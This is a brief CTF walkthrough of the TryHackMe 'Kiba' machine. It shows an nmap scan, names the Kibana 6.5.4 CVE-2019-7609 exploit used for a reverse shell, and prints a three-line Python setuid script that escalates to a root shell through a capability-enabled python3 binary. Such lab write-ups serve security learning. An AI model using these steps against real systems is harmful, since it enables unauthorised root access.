# Introduction

we first add a domain in /etc/hosts so we don't need to remember the IP
```bash
10.10.xx.xx kiba.thm
```

# Enumeration

we do a nmap with some options :\
\
-T4 is for have more threads to accelerate the scan\
-p- is to scan all the ports\
-sV is to scan the version\
\
we run the scan as sudo so it's doing a SYN scan and not a full TCP connection so it's faster

```bash
sudo nmap -T4 -p- -sV kiba.thm
```

we got these open ports
```bash
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
5044/tcp open  lxi-evntsvc?
5601/tcp open  esmagent?
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

on port 5601, we found a webapp named Kibana in version 6.5.4\
this webapp display data vizualisation of ElasticSearch data

we found there is a CVE : https://github.com/LandGrey/CVE-2019-7609/tree/master
we can execute arbitrary command to get a reverse shell

by doing a getcap -r / 2>/dev/null, we find a python3 in a subdirectory in our home folder\
it's have the setuid so we can write a little python script
```
import os
os.setuid(0)
os.system("/bin/bash")
```
